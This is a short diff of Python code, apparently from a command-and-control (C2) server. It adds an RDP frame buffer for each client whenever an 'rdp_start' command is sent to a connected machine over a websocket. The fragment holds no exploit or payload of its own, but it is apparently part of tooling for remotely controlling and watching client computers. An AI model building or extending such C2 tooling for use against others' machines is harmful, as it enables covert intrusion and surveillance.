@@ -927,6 +927,9 @@ def c2_send_command():
 
     try:
         wsc['ws'].send(json.dumps({'type': 'command', 'command': command}))
+        if command.startswith('rdp_start'):
+            with rdp_frames_lock:
+                rdp_frames[client_id] = {'data': b'', 'ts': time.time()}
         return jsonify({'success': True})
     except Exception:
         return jsonify({'error': 'send failed'}), 500
